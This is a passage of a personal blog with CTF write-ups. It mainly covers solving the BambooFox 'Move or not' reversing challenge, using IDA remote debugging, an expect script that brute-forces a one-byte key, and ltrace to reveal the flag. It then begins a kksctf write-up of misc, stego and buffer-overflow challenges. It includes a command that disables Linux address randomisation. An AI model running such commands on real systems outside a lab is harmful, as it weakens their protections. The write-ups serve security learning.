<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.119.132  netmask 255.255.255.0  broadcast 192.168.119.255</span><br><span class="line">        inet6 fe80::9d14:35b9:dc2a:66c6  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:fe:9a:13  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 49088  bytes 61213168 (61.2 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 13714  bytes 1047395 (1.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 678  bytes 60507 (60.5 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 678  bytes 60507 (60.5 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./linux_server64 </span><br><span class="line">IDA Linux 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后到IDA中设置调试器信息，Debugger&gt;Select debugger&gt;Remote Linux Debugger:</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161021326.png" alt="image-20200102161021326"></p>
<p>确定之后，再设置进程信息，Debugger&gt;Process options:</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161415095.png" alt="image-20200102161415095"></p>
<p>文件路径要设置为Linux上的路径，IP为虚拟机的IP，端口就用默认的就行。</p>
<p>确定之后，点击上方的绿色三角按钮或者按下<code>F9</code>启动调试：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161638027.png" alt="image-20200102161638027"></p>
<p>弹出下面的警告，大意就是小心代码执行所带来的的危害，确定就行，不是恶意软件：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102161904643.png" alt="image-20200102161904643"></p>
<p>由于我没有设置任何断点，所以程序还是没能按照我想的情况走下去，在Linux上提示输入Password了，但是IDA中的寄存器却什么信息也没有：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162357326.png" alt="image-20200102162357326"></p>
<p>这时结束掉进程，在<code>main</code>函数设置断点：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162509413.png" alt="image-20200102162509413"></p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162544765.png" alt="image-20200102162544765"></p>
<p>这时我们也可以看到，指令前面的地址是真实的内存地址了。</p>
<p>继续执行，程序断在了刚才的地方：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102162815144.png" alt="image-20200102162815144"></p>
<p>先来简单看一下调试界面，左上方是汇编代码的窗口，左下方是内存区域的数据显示，右上方是三个小窗口（寄存器、已加载模块、线程），右下方是堆栈窗口。基本布局和OD中的一样，习惯了OD，这样看起来特别舒服。</p>
<p>基本的调试快捷键如下：</p>
<ul>
<li>F7：单步步进（进入调用内部）</li>
<li>F8：单步步过（不进入）</li>
<li>Ctrl+F7：执行到返回</li>
<li>F4：执行到光标</li>
<li>F2：设置断点</li>
</ul>
<p>回到刚才说的，要验证Key对loc_201020区域的作用，在这里这片区域的地址和刚才是是不一样的，来看一下反编译的伪码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Second give me your key: &quot;</span>, &amp;v4);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">v4 -= <span class="number">49</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_56290DD48020 + i) += v4;</span><br><span class="line">((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">int</span> *))loc_56290DD48020)(s1, &amp;v4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Then Verify your flag: &quot;</span>);</span><br></pre></td></tr></table></figure>

<p>在“输入Key之后调用<code>scanf</code>函数”处设置断点：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102164719204.png" alt="image-20200102164719204"></p>
<p>然后执行，转到Linux上输入password之后，断在了此处：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./linux_server64 </span><br><span class="line">IDA Linux 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line">=========================================================</span><br><span class="line">[1] Accepting connection from 192.168.119.1...</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: [1] Closing connection from 192.168.119.1...</span><br><span class="line">=========================================================</span><br><span class="line">[2] Accepting connection from 192.168.119.1...</span><br><span class="line">First give me your password: 98416</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>仔细分析：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000056290DB47872 lea     rax, [rbp+var_38]</span><br><span class="line">.text:000056290DB47876 mov     rsi, rax		   ;传参&amp;var_38，var_38就是伪码中的v4</span><br><span class="line">.text:000056290DB47879 lea     rdi, aD         ; &quot;%d&quot;</span><br><span class="line">.text:000056290DB47880 mov     eax, 0</span><br><span class="line">.text:000056290DB47885 call    ___isoc99_scanf</span><br><span class="line">.text:000056290DB4788A mov     eax, [rbp+var_38] ;将获取到的key赋值给eax</span><br><span class="line">.text:000056290DB4788D sub     eax, 49			 ;然后再减去49</span><br><span class="line">.text:000056290DB47890 mov     [rbp+var_38], eax ;再重新赋值给var_38</span><br></pre></td></tr></table></figure>

<p>在这里单步步过，转到Linux上随便输入一个Key：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=========================================================</span><br><span class="line">[2] Accepting connection from 192.168.119.1...</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 78</span><br></pre></td></tr></table></figure>

<p>返回IDA，随后进入修改数据的<code>for</code>循环：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102170301204.png" alt="image-20200102170301204"></p>
<p>详细分析一下循环中的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000056290DB4789C loc_56290DB4789C:</span><br><span class="line">.text:000056290DB4789C mov     eax, [rbp+var_34]      ;var_34在循环开始前设置为0，是索引</span><br><span class="line">.text:000056290DB4789F movsxd  rdx, eax</span><br><span class="line">.text:000056290DB478A2 lea     rax, loc_56290DD48020  ;需要修改的数据的基地址</span><br><span class="line">.text:000056290DB478A9 movzx   eax, byte ptr [rdx+rax];根据索引找到的本次循环需要修改的数据data[i]</span><br><span class="line">.text:000056290DB478AD mov     edx, [rbp+var_38]      ;key</span><br><span class="line">.text:000056290DB478B0 lea     ecx, [rax+rdx]         ;相加的结果放到ecx中</span><br><span class="line">.text:000056290DB478B3 mov     eax, [rbp+var_34]      ;索引i</span><br><span class="line">.text:000056290DB478B6 movsxd  rdx, eax        </span><br><span class="line">.text:000056290DB478B9 lea     rax, loc_56290DD48020  ;数据的基地址</span><br><span class="line">.text:000056290DB478C0 mov     [rdx+rax], cl          ;最后存放的数据只存放了CL寄存器中的，也就是只取最低的字节</span><br><span class="line">.text:000056290DB478C3 add     [rbp+var_34], 1        ;i+1</span><br></pre></td></tr></table></figure>

<p>关键的是最后存放数据的时候只取了key和data相加之后结果的低8位，意思就是如果key的值超过了0xFF，其结果仍然会在0-0xFF中重复，这和之后我写代码爆破可用的Key有关。</p>
<p>循环执行完，会将刚才那一部分区域的数据当做代码执行，这里看到的是<code>call rdx</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000056290DB478CD lea     rdx, loc_56290DD48020</span><br><span class="line">.text:000056290DB478D4 lea     rdi, s1         ; &quot;iAxU.|&amp;30&quot;</span><br><span class="line">.text:000056290DB478DB mov     eax, 0</span><br><span class="line">.text:000056290DB478E0 call    rdx ; loc_56290DD48020</span><br><span class="line">.text:000056290DB478E2 lea     rdi, aThenVerifyYour ; &quot;Then Verify your flag: &quot;</span><br><span class="line">.text:000056290DB478E9 mov     eax, 0</span><br><span class="line">.text:000056290DB478EE call    _printf</span><br></pre></td></tr></table></figure>

<p>跟踪进去看了之后，确实是将修改后的数据当做代码来执行：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102172808761.png" alt="image-20200102172808761"></p>
<p>但是由于key不正确，所以解码出来的汇编代码是会出大问题的，继续执行了几步之后程序就崩溃了：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102172944597.png" alt="image-20200102172944597"></p>
<p>而根据上面的汇编代码，如果解码之后的代码能够正常执行的话，应该会继续提示让输入flag验证，根据这个思路，我们可以写一段简单的代码来爆破可能的key，这里我用到的是<code>expect</code>。</p>
<h4 id="4-expect编程"><a href="#4-expect编程" class="headerlink" title="4.expect编程"></a>4.expect编程</h4><p><code>expect</code>是一个用来实现自动化交互功能的软件套件，基于<code>tcl</code>包。安装命令可以使用下面的，这里我已经安装过了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ sudo apt install tcl expect</span><br><span class="line">[sudo] password <span class="keyword">for</span> spwpun: </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">expect is already the newest version (5.45.4-1).</span><br><span class="line">tcl is already the newest version (8.6.0+9).</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 130 not upgraded.</span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ </span><br></pre></td></tr></table></figure>

<p>我的基本思路是运行题目给出的<code>pro</code>程序，使用expect自动填入password和key，通过一个循环控制key的值来测试，如果接收到”Then Verify your flag: “，就说明key解码后的代码是可以正常执行的，最后输出所有的key。代码很简单，简单借鉴一下网上的一些基础脚本就可以写出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/expect            </span></span><br><span class="line"><span class="comment"># For bamboofoxctf-Move or not</span></span><br><span class="line"><span class="comment"># filename:crack.sh</span></span><br><span class="line"><span class="built_in">set</span> time 30</span><br><span class="line"><span class="built_in">set</span> keys <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> &#123;<span class="built_in">set</span> key 0&#125; &#123;<span class="variable">$key</span>&lt;=255&#125; &#123;incr key&#125; &#123;     <span class="comment">#incr在这里是增加1</span></span><br><span class="line">	spawn ./pro								 <span class="comment">#spawn是另起一个子进程</span></span><br><span class="line">	expect <span class="string">&quot;*password: &quot;</span> &#123;send <span class="string">&quot;98416\r&quot;</span>&#125;    <span class="comment">#如果收到子进程的结果为*password: ,则发送98416\r,这里可以使用正则来匹配，发送的数据最后要加一个换行符</span></span><br><span class="line">	expect <span class="string">&quot;*key: &quot;</span> &#123;send <span class="string">&quot;<span class="variable">$key</span>\r&quot;</span>&#125;</span><br><span class="line">	expect <span class="string">&quot;*flag: &quot;</span> &#123;</span><br><span class="line">		send <span class="string">&quot;Test_flag\r&quot;</span></span><br><span class="line">		<span class="built_in">set</span> keys <span class="string">&quot;<span class="variable">$keys</span> <span class="variable">$key</span>&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">puts <span class="string">&quot;All keys: <span class="variable">$keys</span>\r&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./crack.sh </span><br><span class="line">spawn ./pro</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 0</span><br><span class="line">spawn ./pro</span><br><span class="line">......</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 254</span><br><span class="line">spawn ./pro</span><br><span class="line">First give me your password: 98416</span><br><span class="line">Second give me your key: 255</span><br><span class="line">All keys:  39 43 48 50 114 117 206</span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ </span><br></pre></td></tr></table></figure>

<p>到此知道了所有可能的key，就可以使用IDA动态调试一波，最后在测试50的时候顺利在比对字符串的时候拿到了flag，其中正确解码后的汇编代码如下：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102181832258.png" alt="image-20200102181832258"></p>
<p>rdi是传入变量s1的地址，可以看到，依次对s1的数据进行sub操作，得到正确的flag，strcmp函数比较时可以清楚看到正确的flag：</p>
<p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102182217223.png" alt="image-20200102182217223"></p>
<h4 id="5-ltrace动态调试"><a href="#5-ltrace动态调试" class="headerlink" title="5.ltrace动态调试"></a>5.ltrace动态调试</h4><p>ltrace可以跟踪程序执行时库函数的调用（包括参数），所以也会跟踪strcmp函数的调用，在上面得到所有的keys之后，可以使用它来测试，测试的过程如下，很轻松就得到了flag：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ltrace ./pro</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First give me your password: &quot;</span>)          = 29</span><br><span class="line">__isoc99_scanf(0x5563a643ea06, 0x7fffd7e61358, 0, 0First give me your password: 98416</span><br><span class="line">) = 1</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Second give me your key: &quot;</span>)              = 25</span><br><span class="line">__isoc99_scanf(0x5563a643ea06, 0x7fffd7e61358, 0, 0Second give me your key: 50</span><br><span class="line">) = 1</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Then Verify your flag: &quot;</span>)                = 23</span><br><span class="line">__isoc99_scanf(0x5563a643ea63, 0x7fffd7e61360, 0, 0Then Verify your flag: aaa</span><br><span class="line">) = 1</span><br><span class="line">strcmp(<span class="string">&quot;BambooFox&#123;dyn4mic_1s_4ls0_gr34t&#125;&quot;</span>..., <span class="string">&quot;aaa&quot;</span>) = -31</span><br><span class="line">puts(<span class="string">&quot;You don&#x27;t know dynamic analysis &quot;</span>...You don<span class="string">&#x27;t know dynamic analysis !</span></span><br><span class="line"><span class="string">)      = 34</span></span><br><span class="line"><span class="string">+++ exited (status 0) +++</span></span><br><span class="line"><span class="string">spwpun@ubuntu:~/Documents/20200102$</span></span><br></pre></td></tr></table></figure>

<ul>
<li>flag: BambooFox{dyn4mic_1s_4ls0_gr34t}</li>
</ul>
<h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h4><p>元旦那晚为了这道题肝了一晚，一直在尝试些angr的脚本来爆破，无奈之前没有接触过，最后没有写出来，分析出key的范围之后，手工解出了这道题，实在是菜。看到赛后各位大佬wp中的轻描淡写，我觉得我和他们真是差了不是一点半点。希望看到这篇文章的师傅们不吝建议！</p>
<p>道阻且长，Happy New Year！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/01/01/BambooFox-CTF-Move-or-not/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/01/BambooFox-CTF-Move-or-not/" class="post-title-link" itemprop="url">BambooFox CTF-Move or not</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-01-01 19:24:29" itemprop="dateCreated datePublished" datetime="2020-01-01T19:24:29+08:00">2020-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-01-02 20:23:44" itemprop="dateModified" datetime="2020-01-02T20:23:44+08:00">2020-01-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/01/01/BambooFox-CTF-Move-or-not/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/01/BambooFox-CTF-Move-or-not/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>I spent a long time on this problem, the program enabled PIE, we can disable random_va_space on Linux:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>



<p>And then use IDA for remote debugging. I know that the program needs to detect two values, one is password, it is easy to get <code>98416</code> through IDA static analysis . </p>
<p>The other is the Key, this Key needs to be detected by burst on my first mind. But my coding ability is very weak, and I didn’t write it for one night. </p>
<p>In the end, I know that this Key is used to decode the code of the obfuscated function. It only involves 11 bytes, and it is simply added to the Key to decode. So the size of the key should be only one byte(0x00-0xFF), and then I manually test from 0. After using the wrong key, Segmentation fault error and illegal instruction error will appear. I found that 39 and 43 can avoid the above error, but still I can’t decode the flag.Fortunately, when I tested 50, it happened to be the correct key, and I was able to decode the flag.</p>
<p><img src="/2020/01/01/BambooFox-CTF-Move-or-not/flag.png" alt="flag"></p>
<p>More info <a href="https://spwpun.github.io/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3">at here!</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/30/kksctf-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/30/kksctf-writeup/" class="post-title-link" itemprop="url">kksctf writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-12-30 10:00:15" itemprop="dateCreated datePublished" datetime="2019-12-30T10:00:15+08:00">2019-12-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-01-03 21:49:36" itemprop="dateModified" datetime="2020-01-03T21:49:36+08:00">2020-01-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2019/12/30/kksctf-writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/30/kksctf-writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.</p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ru-e5p-g3"><a href="#ru-e5p-g3" class="headerlink" title="ru!e5p@g3"></a>ru!e5p@g3</h4><ul>
<li>Description: Haven’t you read our rules?</li>
</ul>
<p>As the Decription said, we could find the flag in rules:</p>
<p><img src="/2019/12/30/kksctf-writeup/image-20191230101913885.png" alt="image-20191230101913885"></p>
<ul>
<li> flag: kks{w3lcom3_to_0ur_ru!e5p@g3}</li>
</ul>
<h4 id="Xmas-Tree"><a href="#Xmas-Tree" class="headerlink" title="Xmas Tree"></a>Xmas Tree</h4><ul>
<li>Description: Do you like to decorate the Christmas tree?</li>
</ul>
<p>From the Description, and we could see a Xmas Tree in the right-down of the backgroud image. From the source code of this Xmas Tree, we could see there were several strange <code>span</code> elements, just like this:</p>
<p><img src="/2019/12/30/kksctf-writeup/image-20191230102845917.png" alt="image-20191230102845917"> </p>
<p>So flag may be these elements, use Python to get the all instaces:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">s,i</span>):</span></span><br><span class="line">    coms = []</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;kks&#123;&quot;</span>+<span class="string">&#x27;&#x27;</span>.join(s)+<span class="string">&quot;$$&#125;&quot;</span> <span class="comment">#kks&#123;n3w_y34r_m@dn3$$&#125; new_year_madness</span></span><br><span class="line">        coms.append(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(s)):</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">            permutation(s,i+<span class="number">1</span>)</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">    <span class="keyword">return</span> coms</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;w_y&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;m@d&quot;</span></span><br><span class="line">s3 = <span class="string">&quot;n3&quot;</span></span><br><span class="line">s4 = <span class="string">&quot;n3&quot;</span></span><br><span class="line">s5 = <span class="string">&quot;34r_&quot;</span></span><br><span class="line">strings = [s1, s2, s3, s4, s5]</span><br><span class="line">combines = permutation(strings, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>And see the readable text:</p>
<p><img src="/2019/12/30/kksctf-writeup/image-20191230103632387.png" alt="image-20191230103632387"></p>
<ul>
<li>flag: kks{n3w_y34r_m@dn3$$}</li>
</ul>
<h4 id="Stego-Warmup"><a href="#Stego-Warmup" class="headerlink" title="Stego Warmup"></a>Stego Warmup</h4><ul>
<li>Description: We get some file. Can you find secret?</li>
</ul>
<p>We were given a file named “stego50.jpg”, at first I thought it was about LSB, so I used “StegoSolve.jar” to test, but failed. Then I solved it through “010 Editor”, the flag can be found by seraching text “kks” in it. If you used Linux, there will be another simple command with “strings”: <code>strings stego50.jpg | grep kks</code>.</p>
<ul>
<li>flag: kks{just_s1ml3_st3g0}</li>
</ul>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Baby-buffer-overflow"><a href="#Baby-buffer-overflow" class="headerlink" title="Baby buffer overflow"></a>Baby buffer overflow</h4><p>As the title said, this is a simple buffer overflow chall. It is friendly to beginners just like me, we were given a file named “baby_bof”. </p>
<p>First check the file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file baby_bof </span><br><span class="line">baby_bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=679ffb807feb7aef6982de068fe64bb6deb7fb0c, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec baby_bof </span><br><span class="line">[*] <span 